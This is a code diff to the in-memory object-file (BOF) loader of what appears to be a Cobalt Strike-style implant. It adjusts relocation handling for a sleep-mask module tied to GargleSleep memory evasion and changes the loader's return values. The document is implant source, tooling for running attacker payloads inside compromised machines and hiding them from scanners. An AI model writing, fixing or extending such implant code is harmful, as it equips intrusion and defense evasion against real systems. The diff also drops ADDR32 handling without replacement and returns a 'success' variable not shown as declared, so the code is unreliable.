@@ -303,17 +303,11 @@ BOOL process_reloc(OBJ_RELOC * reloc, char * execsrc, char * execdst, char * sym
 		memcpy(execsrc + reloc->offset, &addr, 8);
 		return TRUE;
 	}
-	else if (reloc->type == RELOC64_ADDR32NB || reloc->type == RELOC64_ADDR32) {
-		DWORD addend, out;
-		UINT64 target;
-		memcpy(&addend, execsrc + reloc->offset, 4);
-		target = (UINT64)(ULONG_PTR)symbol + addend + (UINT64)(ULONG_PTR)soff;
-		if (reloc->type == RELOC64_ADDR32NB && imgbase != NULL)
-			out = (DWORD)(target - (UINT64)(ULONG_PTR)imgbase);
-		else
-			out = (DWORD)target;
-		memcpy(execsrc + reloc->offset, &out, 4);
-		return TRUE;
+	else if (reloc->type == RELOC64_ADDR32NB) {
+		/* Fail the object: a wrong ADDR32NB hangs the sleep-mask BOF and
+		 * never returns from GargleSleep. GargleSleep Sleep()s on FALSE. */
+		post_error_d(0x4f, reloc->type);
+		return FALSE;
 	}
 	else if (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5) {
 		char * rip, * fsymbol;
@@ -415,7 +409,7 @@ static char * bof_cached;
 static SIZE_T bof_cached_size;
 static int    bof_cached_how;
 
-void command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen) {
+BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen) {
 	datap parser;
 	datap relocsparser;
 	datap_buffer code, rdata, data, xdata, pdata, relocs;
@@ -436,7 +430,7 @@ void command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 
 	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
 	if (ftable == NULL)
-		return;
+		return FALSE;
 	setup_functions(ftable);
 
 	data_init(&parser, objblob, objlen);
@@ -451,7 +445,7 @@ void command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	total = (SIZE_T)code.length + rdata.length + data.length + xdata.length + pdata.length + bssSize;
 	if (total == 0) {
 		free(ftable);
-		return;
+		return FALSE;
 	}
 
 	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
@@ -468,7 +462,7 @@ void command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		base = bof_alloc(total, &how);
 		if (base == NULL) {
 			free(ftable);
-			return;
+			return FALSE;
 		}
 		bof_cached = base;
 		bof_cached_size = total;
@@ -562,6 +556,7 @@ void command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 	}
 	free(ftable);
+	return success;
 }
 
 void command_inline_execute_object(char * buffer, int length) {
